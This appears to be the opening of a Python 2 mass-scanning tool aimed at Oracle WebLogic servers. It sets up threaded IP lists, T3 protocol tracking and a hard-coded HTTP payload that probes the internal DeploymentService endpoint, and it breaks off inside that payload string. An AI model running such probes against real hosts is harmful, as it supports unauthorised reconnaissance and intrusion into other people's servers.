import socket
import os
import urllib2
import re
import thread
import time
import datetime
import sys


class scanip:
    def __init__(self):
        self.ip_list = {}
        self.iplist = []
        self.error_iplist = []
        self.error_ip_list = []
        self.t3_success_ip_list = []
        self.t3_error_ip_list = []
        self.wls_version_ip_list = {}
        self.flag_list = []
        self.success_ip_list = []
        self.thread_num = 50
        self.thread_num_2 = 20
        self.timeout = 15
        self.payload = "GET /bea_wls_deployment_internal/DeploymentService HTTP/1.1\r\nHost: 127.0.0.1:7001\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.
